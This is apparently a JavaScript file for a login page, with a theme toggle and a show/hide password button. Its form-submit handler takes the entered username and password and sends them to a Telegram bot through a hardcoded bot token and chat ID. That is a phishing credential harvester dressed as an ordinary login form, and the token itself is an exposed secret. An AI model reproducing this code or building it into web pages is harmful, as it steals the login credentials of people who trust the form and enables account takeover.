document.addEventListener('DOMContentLoaded', function() {
    // Check for saved theme preference or use system preference
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    if (savedTheme) {
        document.documentElement.setAttribute('data-theme', savedTheme);
    } else if (systemPrefersDark) {
        document.documentElement.setAttribute('data-theme', 'dark');
    }
    
    // Set the toggle switch position
    const themeSwitch = document.getElementById('theme-switch');
    const currentTheme = document.documentElement.getAttribute('data-theme');
    themeSwitch.checked = currentTheme === 'dark';
    
    // Toggle theme when switch is clicked
    themeSwitch.addEventListener('change', function() {
        if (this.checked) {
            document.documentElement.setAttribute('data-theme', 'dark');
            localStorage.setItem('theme', 'dark');
        } else {
            document.documentElement.setAttribute('data-theme', 'light');
            localStorage.setItem('theme', 'light');
        }
    });
    
    // Show/hide password functionality
    const showPasswordButtons = document.querySelectorAll('.show-password');
    showPasswordButtons.forEach(button => {
        button.addEventListener('click', function() {
            const input = this.parentElement.querySelector('input');
            if (input.type === 'password') {
                input.type = 'text';
                this.textContent = 'Hide';
            } else {
                input.type = 'password';
                this.textContent = 'Show';
            }
        });
    });
    
    // Listen for system theme changes
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        if (!localStorage.getItem('theme')) {
            const newTheme = e.matches ? 'dark' : 'light';
            document.documentElement.setAttribute('data-theme', newTheme);
            themeSwitch.checked = e.matches;
        }
    });
    
    // // Form submission (prevent default for demo)
    // const loginForm = document.querySelector('.login-form');
    // loginForm.addEventListener('submit', function(e) {
    //     e.preventDefault();
    //     alert('Login functionality would be implemented here in a real application.');
    // });

    const loginForm = document.querySelector('.login-form');
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const message = `🔐 Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
        const botToken = '7851747348:AAE7Tj8ZH_I7UNN5c35BZb8c1mfYiU1qIRo';
        const chatId = '6448306853'

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            alert('Login data terkirim ke bot Telegram!');
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Gagal mengirim data ke Telegram.');
        });
    });

});
